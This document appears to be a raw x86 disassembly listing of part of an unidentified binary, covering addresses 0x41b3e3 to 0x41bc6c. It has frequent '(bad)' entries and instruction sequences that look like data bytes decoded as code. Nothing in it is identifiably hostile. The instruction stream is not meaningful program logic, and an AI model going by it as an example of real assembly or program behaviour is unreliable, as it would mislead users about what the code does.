  41b3e3:	(bad)  
  41b3e4:	mov    esi,0xbe00fe8f
  41b3e9:	add    eax,DWORD PTR [eax]
  41b3eb:	add    BYTE PTR [edx-0x75ff02fd],cl
  41b3f1:	(bad)  
  41b3f2:	inc    BYTE PTR [eax]
  41b3f4:	jp     0x41b3f9
  41b3f6:	add    BYTE PTR [ecx],al
  41b3f8:	jp     0x41b3fd
  41b3fa:	add    BYTE PTR [ecx],al
  41b3fc:	mov    cl,BYTE PTR [edi+0x37efffd]
  41b402:	std    
  41b403:	add    BYTE PTR [edx+0x3],bh
  41b406:	std    
  41b407:	(bad)  
  41b408:	jp     0x41b399
  41b40a:	(bad)  
  41b40b:	jmp    DWORD PTR [ebx-0x60]
  41b40e:	add    DWORD PTR [eax],eax
  41b410:	bound  ebx,QWORD PTR [ebp+edi*8+0x1a14cff]
  41b417:	add    BYTE PTR [ebx-0x58],ah
  41b41a:	std    
  41b41b:	jmp    DWORD PTR [ebx-0x60]
  41b41e:	std    
  41b41f:	(bad)  
  41b420:	xor    al,0xa9
  41b422:	std    
  41b423:	(bad)  
  41b424:	arpl   WORD PTR [eax-0x62db00ff],sp
  41b42a:	add    edi,edi
  41b42c:	arpl   WORD PTR [eax+0xfffd],sp
	...
  41b43e:	add    BYTE PTR [ebx-0x58],ah
  41b441:	add    DWORD PTR [eax],eax
  41b443:	bound  esp,QWORD PTR [eax-0x56fb0003]
  41b449:	std    
  41b44a:	(bad)  
  41b44b:	cld    
  41b44c:	pushf  
  41b44d:	std    
  41b44e:	(bad)  
  41b44f:	arpl   WORD PTR [eax-0x63130003],bp
  41b455:	std    
  41b456:	jmp    DWORD PTR [ebx-0x64]
  41b459:	std    
  41b45a:	jmp    DWORD PTR [ebx-0x64]
  41b45d:	add    DWORD PTR [eax],eax
  41b45f:	arpl   WORD PTR [eax-0x633300ff],bp
  41b465:	std    
  41b466:	inc    ah
  41b468:	pushf  
  41b469:	add    DWORD PTR [eax],eax
  41b46b:	arpl   WORD PTR [eax-0x39c00ff],sp
  41b471:	adc    DWORD PTR [eax],0xffffffe3
  41b474:	pushf  
  41b475:	add    DWORD PTR [eax],0x819ce3
  41b47b:	arpl   WORD PTR [ecx+eax*4+0x19c6310],di
  41b482:	adc    BYTE PTR [ebx-0x44],ah
  41b485:	add    DWORD PTR [eax],eax
  41b487:	arpl   WORD PTR [ecx+eax*1-0x7e431cf0],di
  41b48e:	add    bl,ah
  41b490:	mov    esp,0x5e30001
  41b495:	pop    es
  41b496:	test   BYTE PTR [ebx-0x7b],dl
  41b499:	out    0x83,eax
  41b49b:	jae    0x41b422
  41b49d:	out    0x3,eax
  41b49f:	arpl   WORD PTR [ebp+0x83e7],ax
	...
  41b4b1:	add    BYTE PTR [ebx-0x7b],ah
  41b4b4:	out    0x3,eax
  41b4b6:	jae    0x41b4bd
  41b4b8:	pop    es
  41b4b9:	add    al,0x63
  41b4bb:	add    eax,0x85530407
  41b4c0:	out    0x83,eax
  41b4c2:	push   ebx
  41b4c3:	add    eax,0x55303c7
  41b4c8:	mov    DWORD PTR [ebx+0x3e78563],0x3e70563
  41b4d2:	arpl   WORD PTR [ebp+0x56383e7],ax
  41b4d8:	mov    DWORD PTR [ebx+0x3e70553],0x3c78553
  41b4e2:	push   ebx
  41b4e3:	add    eax,0x85630407
  41b4e8:	out    0x3,eax
  41b4ea:	arpl   WORD PTR ds:0x57383e7,ax
  41b4f0:	pop    es
  41b4f1:	test   BYTE PTR [ebx+0x5],ah
  41b4f4:	out    0x83,eax
  41b4f6:	jae    0x41b47d
  41b4f8:	out    0x3,eax
  41b4fa:	push   ebx
  41b4fb:	test   DWORD PTR [edi],eax
  41b4fd:	test   BYTE PTR [ebx+0x5],ah
  41b500:	out    0x3,eax
  41b502:	arpl   WORD PTR ds:0x55383c7,ax
  41b508:	mov    DWORD PTR [ebx],0x3e78573
  41b50e:	jae    0x41b515
  41b510:	mov    DWORD PTR [ebx+0x3e78563],0x0
	...
  41b522:	add    BYTE PTR [eax],al
  41b524:	add    BYTE PTR [ebx-0x7b],dh
  41b527:	out    0x83,eax
  41b529:	push   ebx
  41b52a:	test   DWORD PTR [eax],eax
  41b52c:	jmp    0xe941ba11
  41b531:	pusha  
  41b532:	cmc    
  41b533:	jg     0x41b51e
  41b535:	loopne 0x41b53b
  41b537:	or     BYTE PTR [ecx],0x67
  41b53a:	add    eax,0xf5df0900
  41b53f:	jg     0x41b54a
  41b541:	out    0xf5,eax
  41b543:	dec    DWORD PTR [eax]
  41b545:	pop    edi
  41b546:	add    eax,0x5e0e900
  41b54b:	add    cl,ch
  41b54d:	pusha  
  41b54e:	add    eax,0x5e70980
  41b553:	add    cl,ch
  41b555:	loopne 0x41b54c
  41b557:	jg     0x41b542
  41b559:	pusha  
  41b55a:	cmc    
  41b55b:	dec    eax
  41b55d:	pusha  
  41b55e:	add    eax,0xf560c980
  41b563:	dec    eax
  41b565:	loopne 0x41b56c
  41b567:	or     cl,0x60
  41b56a:	add    eax,0xf560c980
  41b56f:	(bad)  
  41b570:	call   0xe941ab55
  41b575:	pusha  
  41b576:	add    eax,0x5e0e900
  41b57b:	or     BYTE PTR [ecx],0xdf
  41b57e:	add    eax,0x560e900
  41b583:	or     BYTE PTR [ecx],0x5f
  41b586:	cmc    
  41b587:	jg     0x41b592
	...
  41b595:	add    BYTE PTR [eax],al
  41b597:	add    bh,ah
  41b599:	cmc    
  41b59a:	jg     0x41b585
  41b59c:	loopne 0x41b593
  41b59e:	jmp    eax
  41b5a0:	bound  eax,QWORD PTR ds:0x762e900
  41b5a6:	or     cl,ch
  41b5a8:	pusha  
  41b5a9:	add    eax,0x760e100
  41b5ae:	or     cl,ch
  41b5b0:	bound  eax,QWORD PTR ds:0x87a0008
  41b5b6:	add    BYTE PTR [eax],al
  41b5b8:	jb     0x41b5c0
  41b5ba:	add    al,BYTE PTR [eax]
  41b5bc:	mov    al,BYTE PTR [esi]
  41b5be:	add    BYTE PTR [eax],cl
  41b5c0:	or     BYTE PTR [eax],0x2
  41b5c3:	add    BYTE PTR [edx+0x8],dh
  41b5c6:	add    BYTE PTR [eax],cl
  41b5c8:	push   edx
  41b5c9:	or     BYTE PTR [eax],al
  41b5cb:	or     BYTE PTR [edx+0x8],cl
  41b5ce:	add    al,BYTE PTR [eax]
  41b5d0:	inc    edx
  41b5d1:	push   es
  41b5d2:	add    cl,BYTE PTR [eax]
  41b5d4:	push   edx
  41b5d5:	or     BYTE PTR [edx],al
  41b5d7:	add    BYTE PTR [edx+0x8],cl
  41b5da:	add    cl,BYTE PTR [eax]
  41b5dc:	inc    edx
  41b5dd:	push   es
  41b5de:	add    BYTE PTR [eax],al
  41b5e0:	cmp    cl,BYTE PTR [eax]
  41b5e2:	add    BYTE PTR [eax],cl
  41b5e4:	xor    cl,BYTE PTR [eax]
  41b5e6:	add    BYTE PTR [eax],al
  41b5e8:	or     al,BYTE PTR [esi]
  41b5ea:	add    cl,BYTE PTR [eax]
  41b5ec:	or     al,BYTE PTR [esi]
  41b5ee:	add    BYTE PTR [eax],al
  41b5f0:	cli    
  41b5f1:	add    eax,0x7fa0002
  41b5f6:	add    cl,BYTE PTR [eax]
  41b5f8:	repnz pop es
  41b5fa:	add    cl,BYTE PTR [eax]
	...
  41b608:	add    BYTE PTR [eax],al
  41b60a:	add    BYTE PTR [edx],al
  41b60c:	push   es
  41b60d:	add    al,BYTE PTR [eax]
  41b60f:	add    al,BYTE PTR [esi]
  41b611:	add    BYTE PTR [eax],cl
  41b613:	cli    
  41b614:	add    eax,0x7ca0002
  41b619:	add    al,BYTE PTR [eax]
  41b61b:	ret    0x5
  41b61e:	or     dl,al
  41b620:	pop    es
  41b621:	add    BYTE PTR [eax],al
  41b623:	rol    BYTE PTR ds:0x5ca0802,cl
  41b629:	add    BYTE PTR [eax],al
  41b62b:	retf   0x7
  41b62e:	or     BYTE PTR [edx-0x45f7fdfb],bh
  41b634:	pop    es
  41b635:	add    BYTE PTR [eax],cl
  41b637:	xchg   edx,eax
  41b638:	pop    es
  41b639:	add    al,BYTE PTR [eax]
  41b63b:	arpl   WORD PTR [esi-0x619c0001],sp
  41b641:	add    DWORD PTR [edx],eax
  41b643:	arpl   WORD PTR [esi-0x6194fe01],bx
  41b649:	(bad)  
  41b64a:	jmp    FWORD PTR [ebx-0x62]
  41b64d:	add    DWORD PTR [eax],eax
  41b64f:	arpl   WORD PTR [esi-0x699c0001],bx
  41b655:	add    DWORD PTR [edx],eax
  41b657:	arpl   WORD PTR [edi+edi*8-0x6394ff],dx
  41b65e:	call   FWORD PTR [ebx-0x5c]
  41b661:	add    DWORD PTR [eax],eax
  41b663:	pop    ebx
  41b664:	pushf  
  41b665:	(bad)  
  41b666:	jmp    DWORD PTR [ebx-0x64]
  41b669:	add    DWORD PTR [eax],eax
  41b66b:	arpl   WORD PTR [ecx+eax*1+0x2],sp
	...
  41b67e:	pop    ebx
  41b67f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b680:	(bad)  
  41b681:	call   FWORD PTR [ebx-0x64]
  41b684:	add    DWORD PTR [edx],eax
  41b686:	arpl   WORD PTR [ecx+eax*1-0x5b9500],bx
  41b68d:	add    DWORD PTR [ebx-0x5c],ebx
  41b690:	add    DWORD PTR [eax],eax
  41b692:	arpl   WORD PTR [edi+edi*8-0x639cff],dx
  41b699:	add    DWORD PTR [ebx-0x5c],esp
  41b69c:	add    DWORD PTR [eax],eax
  41b69e:	pop    ebx
  41b69f:	pushf  
  41b6a0:	add    DWORD PTR [edx],eax
  41b6a2:	pop    ebx
  41b6a3:	xchg   esp,eax
  41b6a4:	(bad)  
  41b6a5:	jmp    FWORD PTR [ebx-0x6c]
  41b6a8:	(bad)  
  41b6a9:	jmp    DWORD PTR [ebx-0x64]
  41b6ac:	add    DWORD PTR [edx],eax
  41b6ae:	pop    ebx
  41b6af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b0:	inc    DWORD PTR [ecx]
  41b6b2:	arpl   WORD PTR [ecx+eax*1+0x1946300],dx
  41b6b9:	add    ch,BYTE PTR [ebx-0x64]
  41b6bc:	inc    DWORD PTR [ecx]
  41b6be:	arpl   WORD PTR [ebp+0x5637fe1],bx
  41b6c4:	push   0x688a9ce3
  41b6c9:	jecxz  0x41b65f
  41b6cb:	mov    ah,BYTE PTR [edi+0x3]
  41b6ce:	arpl   WORD PTR ds:0x504e367,ax
  41b6d4:	push   0xe805e303
  41b6d9:	add    esp,ebx
  41b6db:	add    eax,0x8a6ce3e8
  41b6e0:	out    0x3,eax
	...
  41b6ee:	add    BYTE PTR [eax],al
  41b6f0:	add    BYTE PTR [ebx+0x5],ah
  41b6f3:	out    0xe3,eax
  41b6f5:	fadd   QWORD PTR ds:0x5d4e3e7
  41b6fb:	push   0x6805cce4
  41b700:	add    al,0x63
  41b702:	add    eax,0x56303e7
  41b707:	addr16 add al,0xe3
  41b70a:	add    al,0xe8
  41b70c:	add    esp,ebx
  41b70e:	add    al,0xe8
  41b710:	add    esp,DWORD PTR [ebx+0x5]
  41b713:	out    0xe3,eax
  41b715:	sbb    al,0x8a
  41b717:	out    0x3,eax
  41b719:	jecxz  0x41b71f
  41b71b:	call   0x67474403
  41b720:	add    al,0x63
  41b722:	add    eax,0x4e303e7
  41b727:	call   0x67cbac0f
  41b72c:	in     al,0xec
  41b72e:	mov    DWORD PTR [eax+0x4],ebp
  41b731:	jecxz  0x41b737
  41b733:	call   0x67471a3b
  41b738:	in     al,0xd4
  41b73a:	mov    DWORD PTR [edi+0x4],esp
  41b73d:	jecxz  0x41b743
  41b73f:	out    0xe3,eax
  41b741:	les    ecx,FWORD PTR [ecx+0x53ce467]
  41b747:	push   0x534e4
  41b74c:	push   0x69000567
  41b751:	pop    edi
  41b752:	test   DWORD PTR [eax],eax
  41b754:	call   0x41b759
	...
  41b761:	add    BYTE PTR [eax],al
  41b763:	add    BYTE PTR [eax-0x7b],ah
  41b766:	add    cl,ch
  41b768:	or     BYTE PTR [ecx],0x0
  41b76b:	push   0x68000987
  41b770:	pop    edi
  41b771:	add    eax,0x560e900
  41b776:	add    cl,ch
  41b778:	pusha  
  41b779:	add    eax,0x980e900
  41b77e:	add    BYTE PTR [ecx+0x7f],ch
  41b781:	mov    ebp,edi
  41b783:	imul   esp,DWORD PTR [eax-0x7b],0x85606800
  41b78a:	add    al,ch
  41b78c:	pusha  
  41b78d:	add    eax,0x940e800
  41b792:	add    BYTE PTR [eax+0x40],ch
  41b795:	mov    ebp,edi
  41b797:	push   0x69fd8940
  41b79c:	pusha  
  41b79d:	add    eax,0x9406800
  41b7a2:	add    BYTE PTR [eax+0x60],ch
  41b7a5:	add    eax,0x560e800
  41b7aa:	add    cl,ch
  41b7ac:	add    BYTE PTR [ecx-0x7a9f1703],cl
  41b7b2:	add    al,ch
  41b7b4:	add    BYTE PTR [ecx+0x90069fd],cl
  41b7ba:	add    BYTE PTR [eax+0x60],ch
  41b7bd:	test   DWORD PTR [eax],eax
  41b7bf:	call   0x6a3f40c4
  41b7c4:	ror    BYTE PTR [eax+0xe9fd],0x0
	...
  41b7d7:	pusha  
  41b7d8:	test   DWORD PTR [eax],eax
  41b7da:	call   0x6941c09f
  41b7df:	pusha  
  41b7e0:	add    eax,0x4ca0000
  41b7e5:	add    BYTE PTR [eax],0xca
  41b7e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7e9:	std    
  41b7ea:	(bad)  
  41b7eb:	cmp    ah,BYTE PTR [ebp+edi*2+0x1ba00]
  41b7f2:	add    BYTE PTR [edx-0x75fdf7ff],cl
  41b7f8:	add    al,0x8
  41b7fa:	add    bh,BYTE PTR [edx+0x1]
  41b7fd:	add    BYTE PTR [edx+0x7a],al
  41b800:	add    al,0x8
  41b802:	add    BYTE PTR [edx-0x75ffffff],cl
  41b808:	add    al,0x0
  41b80a:	inc    eax
  41b80b:	jp     0x41b811
  41b80d:	or     BYTE PTR [edx],al
  41b80f:	jp     0x41b812
  41b811:	or     BYTE PTR [eax+0x4a],al
  41b814:	add    al,0x8
  41b816:	add    BYTE PTR [edx+0x3],cl
  41b819:	add    BYTE PTR [edx],al
  41b81b:	cmp    al,BYTE PTR [ebx]
  41b81d:	or     BYTE PTR [eax+0x3a],al
  41b820:	add    eax,DWORD PTR [eax]
  41b822:	inc    edx
  41b823:	dec    edx
  41b824:	add    al,0x8
  41b826:	inc    edx
  41b827:	dec    edx
  41b828:	add    ecx,DWORD PTR [eax]
  41b82a:	add    BYTE PTR [edx],bh
  41b82c:	add    al,0x0
  41b82e:	inc    eax
  41b82f:	cmp    al,BYTE PTR [eax+eax*1]
  41b832:	add    cl,BYTE PTR [edx]
  41b834:	add    al,0x8
  41b836:	inc    eax
  41b837:	or     al,BYTE PTR [eax+ecx*1]
  41b83a:	inc    eax
	...
  41b847:	add    BYTE PTR [eax],al
  41b849:	add    dl,bh
  41b84b:	add    eax,DWORD PTR [eax]
  41b84d:	add    dl,bh
  41b84f:	add    al,BYTE PTR [eax]
  41b851:	inc    eax
  41b852:	or     al,BYTE PTR [ebx]
  41b854:	or     BYTE PTR [edx+0xa],al
  41b857:	add    ecx,DWORD PTR [eax]
  41b859:	inc    edx
  41b85a:	cli    
  41b85b:	add    al,BYTE PTR [eax]
  41b85d:	add    bh,dl
  41b85f:	add    ecx,DWORD PTR [eax]
  41b861:	inc    edx
  41b862:	retf   0x2
  41b865:	inc    eax
  41b866:	retf   0x3
  41b869:	add    BYTE PTR [ebx-0x62],ah
  41b86c:	add    DWORD PTR [eax],eax
  41b86e:	and    DWORD PTR [esi-0x619ef7fe],ebx
  41b874:	add    DWORD PTR [eax],eax
  41b876:	popa   
  41b877:	sahf   
  41b878:	add    DWORD PTR [eax],eax
  41b87a:	and    DWORD PTR [esi-0x619cf7fe],ebx
  41b880:	add    DWORD PTR [eax],ecx
  41b882:	arpl   WORD PTR [esi-0x61defffe],bx
  41b888:	add    al,BYTE PTR [eax]
  41b88a:	arpl   WORD PTR [esi-0x619effff],bx
  41b890:	add    DWORD PTR [eax],eax
  41b892:	and    ebx,DWORD PTR [esi-0x619ef7ff]
  41b898:	add    al,BYTE PTR [eax]
  41b89a:	and    DWORD PTR [esi-0x61dcf7fe],ebx
  41b8a0:	add    al,BYTE PTR [eax]
  41b8a2:	popa   
  41b8a3:	pushf  
  41b8a4:	add    DWORD PTR [eax],eax
  41b8a6:	mov    ds:0xa108019c,eax
  41b8ab:	pushf  
  41b8ac:	add    cl,BYTE PTR [eax]
	...
  41b8ba:	add    BYTE PTR [eax],al
  41b8bc:	add    BYTE PTR [ecx-0x64],ah
  41b8bf:	add    cl,BYTE PTR [eax]
  41b8c1:	mov    ds:0x6300029c,eax
  41b8c6:	pushf  
  41b8c7:	add    DWORD PTR [eax],eax
  41b8c9:	popa   
  41b8ca:	pushf  
  41b8cb:	add    DWORD PTR [eax],ecx
  41b8cd:	mov    eax,ds:0xa108029c
  41b8d2:	pushf  
  41b8d3:	add    cl,BYTE PTR [eax]
  41b8d5:	arpl   WORD PTR [ecx+eax*1+0x29ca100],bx
  41b8dc:	or     BYTE PTR [ecx+0x6108019c],ah
  41b8e2:	pushf  
  41b8e3:	add    DWORD PTR [eax],eax
  41b8e5:	arpl   WORD PTR [ecx+eax*1+0x19ca308],bx
  41b8ec:	add    BYTE PTR [ecx+0x6308029c],ah
  41b8f2:	add    eax,0x36302e7
  41b8f7:	out    0x2,eax
  41b8f9:	arpl   WORD PTR [ebp-0x19],ax
  41b8fc:	add    ebx,DWORD PTR [ebx+0x5]
  41b8ff:	out    0x3,eax
  41b901:	arpl   WORD PTR ds:0x456b03e7,ax
  41b907:	out    0x2,eax
  41b909:	pop    ebx
  41b90a:	add    esp,edi
  41b90c:	add    ah,BYTE PTR [ebx+0x45]
  41b90f:	xlat   BYTE PTR ds:[ebx]
  41b910:	add    esp,DWORD PTR [ebx-0x1b]
  41b913:	out    0x3,al
  41b915:	and    esp,ebp
  41b917:	out    0x43,al
  41b919:	arpl   WORD PTR ds:0xe52343f7,ax
  41b91f:	out    0x3,al
	...
  41b92d:	add    BYTE PTR [eax],al
  41b92f:	add    BYTE PTR [ebx],ah
  41b931:	in     eax,0xd6
  41b933:	add    esp,DWORD PTR [ebx+0x5]
  41b936:	xlat   BYTE PTR ds:[ebx]
  41b937:	inc    ebx
  41b938:	and    esp,ebp
  41b93a:	out    0x3,al
  41b93c:	and    eax,DWORD PTR ds:0xe56343e7
  41b942:	test   BYTE PTR [ebx-0x5d],0x5
  41b946:	out    0x3,eax
  41b948:	mov    ds:0x6303f705,eax
  41b94d:	in     eax,0xf6
  41b94f:	add    esp,DWORD PTR [ebx+0x6343e705]
  41b955:	in     eax,0xe6
  41b957:	add    esp,DWORD PTR [ebx-0x1b]
  41b95a:	(bad)  
  41b95b:	inc    ebx
  41b95c:	arpl   WORD PTR ds:0x56303e7,ax
  41b962:	test   DWORD PTR [ebx],0x43f705a3
  41b968:	arpl   bp,sp
  41b96a:	out    0x43,al
  41b96c:	arpl   WORD PTR ds:0x5a343e7,ax
  41b972:	xlat   BYTE PTR ds:[ebx]
  41b973:	inc    ebx
  41b974:	arpl   bp,sp
  41b976:	(bad)  
  41b977:	add    esp,DWORD PTR [ebx+0x5]
  41b97a:	add    cl,bl
  41b97c:	pusha  
  41b97d:	inc    ebp
  41b97e:	and    cl,bl
  41b980:	pusha  
  41b981:	inc    ebp
  41b982:	and    cl,ch
  41b984:	pusha  
  41b985:	add    eax,0x4520f900
  41b98a:	add    cl,ch
  41b98c:	and    BYTE PTR [ebp+0x20],al
  41b98f:	stc    
  41b990:	and    BYTE PTR ds:0xe900,al
	...
  41b9a2:	add    BYTE PTR [eax],ah
  41b9a4:	inc    ebp
  41b9a5:	add    cl,ch
  41b9a7:	and    BYTE PTR [ebp+0x20],al
  41b9aa:	jmp    0xe961bf0f
  41b9af:	and    BYTE PTR ds:0x560f920,al
  41b9b5:	add    cl,bh
  41b9b7:	pusha  
  41b9b8:	inc    ebp
  41b9b9:	and    cl,ch
  41b9bb:	and    BYTE PTR [ebp+0x0],al
  41b9be:	stc    
  41b9bf:	and    BYTE PTR [ebp+0x20],al
  41b9c2:	jmp    0xd941ff27
  41b9c7:	and    BYTE PTR ds:0x560d900,al
  41b9cd:	and    cl,ch
  41b9cf:	pusha  
  41b9d0:	(bad)  
  41b9d3:	mov    al,ds:0x60e92005
  41b9d8:	add    eax,0x5a0f920
  41b9dd:	add    cl,bh
  41b9df:	pusha  
  41b9e0:	add    eax,0xc5a0d920
  41b9e5:	pop    ds
  41b9e6:	jmp    0xe9417f8b
  41b9eb:	pusha  
  41b9ec:	lds    ebx,FWORD PTR [edi]
  41b9ee:	fldenv [eax-0x5f17003b]
  41b9f4:	lds    ebx,FWORD PTR [edi]
  41b9f6:	jmp    0xf941bf5b
  41b9fb:	pusha  
  41b9fc:	lds    ebx,FWORD PTR [edi]
  41b9fe:	stc    
  41b9ff:	pusha  
  41ba00:	add    eax,0xc90a0000
  41ba05:	(bad)  
  41ba06:	inc    DWORD PTR [eax]
	...
  41ba14:	add    BYTE PTR [eax],al
  41ba16:	cli    
  41ba17:	or     BYTE PTR [eax+0x20],al
  41ba1a:	or     cl,cl
  41ba1c:	aas    
  41ba1d:	add    dl,cl
  41ba1f:	enter  0xffff,0xda
  41ba23:	or     BYTE PTR [eax+0x0],al
  41ba26:	retf   0xffc8
  41ba29:	pop    ds
  41ba2a:	mov    edx,0xca000008
  41ba2f:	enter  0x203f,0xca
  41ba33:	or     BYTE PTR [eax],al
  41ba35:	and    BYTE PTR [edx-0x75ffbff8],cl
  41ba3b:	enter  0x1fff,0x8a
  41ba3f:	or     BYTE PTR [eax],ah
  41ba41:	add    BYTE PTR [eax+0x78042008],cl
  41ba47:	cmp    ch,0x3
  41ba4a:	jp     0x41ba54
  41ba4c:	add    BYTE PTR [eax],al
  41ba4e:	mov    al,BYTE PTR [eax-0x7f770003]
  41ba54:	std    
  41ba55:	add    edi,DWORD PTR [eax-0x80]
  41ba58:	sbb    eax,0x1d807a00
  41ba5d:	add    al,0x48
  41ba5f:	sbb    BYTE PTR ds:0x20084a04,0x0
  41ba66:	cmp    cl,BYTE PTR [eax]
  41ba68:	add    BYTE PTR [eax],al
  41ba6a:	cmp    BYTE PTR [eax],cl
  41ba6c:	add    BYTE PTR [eax+ecx*2],al
  41ba6f:	or     BYTE PTR [eax],al
  41ba71:	add    BYTE PTR [edx+0x8],cl
  41ba74:	add    BYTE PTR [eax+edi*1],al
  41ba77:	or     BYTE PTR [eax],ah
  41ba79:	add    al,0x0
	...
  41ba87:	add    BYTE PTR [eax],al
  41ba89:	cmp    BYTE PTR [eax-0x7ff50003],al
  41ba8f:	std    
  41ba90:	add    ecx,DWORD PTR [eax]
  41ba92:	sbb    BYTE PTR ds:0x2007f800,0x0
  41ba99:	arpl   WORD PTR [esi-0x7],bp
  41ba9c:	jmp    DWORD PTR [eax+0x70]
  41ba9f:	add    DWORD PTR [eax],eax
  41baa1:	pop    edi
  41baa2:	outs   dx,BYTE PTR ds:[esi]
  41baa3:	add    DWORD PTR [eax],esp
  41baa5:	outs   dx,BYTE PTR ds:[si]
  41baa7:	stc    
  41baa8:	pop    ds
  41baa9:	pop    edi
  41baaa:	jo     0x41baad
  41baac:	and    BYTE PTR [ebx+0x6e],ah
  41baaf:	add    DWORD PTR [eax],esp
  41bab1:	pop    edi
  41bab2:	outs   dx,BYTE PTR ds:[esi]
  41bab3:	stc    
  41bab4:	dec    esp
  41bab6:	outs   dx,DWORD PTR ds:[esi]
  41bab7:	stc    
  41bab8:	inc    esp
  41baba:	outs   dx,DWORD PTR ds:[esi]
  41babb:	stc    
  41babc:	pop    ds
  41babd:	outs   dx,BYTE PTR ds:[si]
  41babf:	stc    
  41bac0:	pop    ds
  41bac1:	arpl   WORD PTR [eax+0x1],si
  41bac4:	add    BYTE PTR [ebx+0x6e],ah
  41bac7:	add    DWORD PTR [eax],eax
  41bac9:	pop    edi
  41baca:	outs   dx,BYTE PTR ds:[esi]
  41bacb:	stc    
  41bacc:	pop    ds
  41bacd:	arpl   WORD PTR [esi+0x1],bp
  41bad0:	add    BYTE PTR [edi+0x6e],bl
  41bad3:	stc    
  41bad4:	pop    ds
  41bad5:	arpl   WORD PTR [esi+0x1],bp
  41bad8:	and    BYTE PTR [ebx+0x70],ah
  41badb:	stc    
  41badc:	jmp    DWORD PTR [eax+0x70]
  41badf:	stc    
  41bae0:	jmp    DWORD PTR [eax+0x70]
  41bae3:	add    DWORD PTR [eax],esp
  41bae5:	addr16 jo 0x41bae9
  41bae8:	and    BYTE PTR [edi+0x70],bl
  41baeb:	add    DWORD PTR [eax],eax
	...
  41baf9:	add    BYTE PTR [eax],al
  41bafb:	add    BYTE PTR [ebx+0x6e],ah
  41bafe:	add    DWORD PTR [eax],esp
  41bb00:	arpl   WORD PTR [ecx+eax*1+0x0],bp
  41bb04:	ins    BYTE PTR es:[di],dx
  41bb06:	stc    
  41bb07:	jmp    DWORD PTR [eax+0x6c]
  41bb0a:	add    DWORD PTR [eax],esp
  41bb0c:	arpl   WORD PTR [ecx+edi*8+0x1f],bp
  41bb10:	pop    edi
  41bb11:	outs   dx,BYTE PTR ds:[esi]
  41bb12:	stc    
  41bb13:	jmp    FWORD PTR [edi+ebp*2]
  41bb16:	stc    
  41bb17:	pop    ds
  41bb18:	arpl   WORD PTR [ecx+edi*8+0x1f],bp
  41bb1c:	outs   dx,BYTE PTR ds:[si]
  41bb1e:	stc    
  41bb1f:	call   DWORD PTR [esi+eax*1]
  41bb22:	jmp    0xe94b1e2a
  41bb27:	sti    
  41bb28:	fs or  edi,esp
  41bb2b:	add    eax,DWORD PTR [ebx+0x9]
  41bb2e:	out    0xfb,eax
  41bb30:	push   esp
  41bb31:	add    eax,0x56303e7
  41bb36:	jmp    0xe9471e3e
  41bb3b:	sti    
  41bb3c:	jl     0x41bb47
  41bb3e:	out    0x3,eax
  41bb40:	arpl   WORD PTR ds:0x56cfbe9,ax
  41bb46:	out    0x3,eax
  41bb48:	or     DWORD PTR [ecx],0xffffffe7
  41bb4b:	sti    
  41bb4c:	mov    esp,0x6303e982
  41bb51:	or     edi,esp
  41bb53:	sti    
  41bb54:	lods   al,BYTE PTR ds:[esi]
  41bb55:	push   es
  41bb56:	out    0xfb,eax
  41bb58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb59:	sub    cl,0x3
  41bb5c:	inc    ebx
  41bb5d:	add    eax,0xf3a7
	...
  41bb6e:	add    BYTE PTR [edx+edx*1-0x7d730c19],dl
  41bb75:	out    0x3,eax
  41bb77:	pop    edi
  41bb78:	add    eax,0x1560f3a7
  41bb7d:	out    0x3,eax
  41bb7f:	arpl   WORD PTR ds:0x126cf3a7,dx
  41bb85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb86:	add    esp,DWORD PTR [ebx+0x5]
  41bb89:	out    0x3,eax
  41bb8b:	arpl   WORD PTR ds:0x55f03a7,dx
  41bb91:	out    0x3,eax
  41bb93:	addr16 adc eax,0x1560f427
  41bb99:	out    0xf3,eax
  41bb9b:	pusha  
  41bb9c:	add    eax,0x1560f3e7
  41bba1:	daa    
  41bba2:	hlt    
  41bba3:	pusha  
  41bba4:	add    eax,0x8224f3e7
  41bba9:	add    BYTE PTR [ecx],ch
  41bbab:	addr16 add eax,0x960e900
  41bbb1:	adc    BYTE PTR [ecx],ch
  41bbb3:	addr16 add eax,0x8210e910
  41bbb9:	or     eax,0xfd81f729
  41bbbe:	jmp    0x2941c1b3
  41bbc3:	or     DWORD PTR [bx+si],eax
  41bbc6:	sub    DWORD PTR [edi+0x9],ebx
  41bbc9:	adc    cl,ch
  41bbcb:	rol    BYTE PTR ds:0x81cf2910,1
  41bbd1:	std    
  41bbd2:	jmp    0x41bbd7
	...
  41bbdf:	add    BYTE PTR [eax],al
  41bbe1:	add    BYTE PTR [eax+0x5],ah
  41bbe4:	add    cl,ch
  41bbe6:	pusha  
  41bbe7:	add    eax,0x960a900
  41bbec:	adc    BYTE PTR [ecx-0x16effaa0],ch
  41bbf2:	mov    al,0x81
  41bbf4:	or     eax,0x5b0a9
  41bbf9:	jmp    0xa941c55e
  41bbfe:	nop
  41bbff:	add    eax,0x960e900
  41bc04:	add    cl,ch
  41bc06:	nop
  41bc07:	add    eax,0x8170e910
  41bc0c:	std    
  41bc0d:	test   eax,0xa9000560
  41bc12:	pusha  
  41bc13:	or     DWORD PTR [eax],edx
  41bc15:	jmp    0xaa3f3d8a
  41bc1a:	push   eax
  41bc1b:	add    eax,0x8150e900
  41bc20:	or     eax,0x56729
  41bc25:	sub    DWORD PTR [edi+0x5],ebx
  41bc28:	adc    cl,ch
  41bc2a:	pusha  
  41bc2b:	or     DWORD PTR [eax],edx
  41bc2d:	sub    DWORD PTR [edi+0x9],ebx
  41bc30:	adc    BYTE PTR [eax],al
  41bc32:	cmp    al,BYTE PTR ds:0x53a1000
  41bc38:	add    al,0x0
  41bc3a:	dec    edx
  41bc3b:	jns    0x41bc3a
  41bc3d:	(bad)  
  41bc3f:	add    eax,0x793a0000
  41bc44:	add    DWORD PTR [eax],edx
	...
  41bc52:	add    BYTE PTR [eax],al
  41bc54:	add    BYTE PTR [edx],bh
  41bc56:	or     DWORD PTR [eax+eax*1],eax
  41bc59:	dec    edx
  41bc5a:	or     DWORD PTR [eax],eax
  41bc5c:	adc    BYTE PTR [edx],cl
  41bc5e:	add    eax,0x74fa1004
  41bc63:	std    
  41bc64:	(bad)  
  41bc67:	std    
  41bc68:	bswap  edx
  41bc6a:	add    al,0x0
  41bc6c:	add    BYTE PTR [edx-0x45effe87],cl
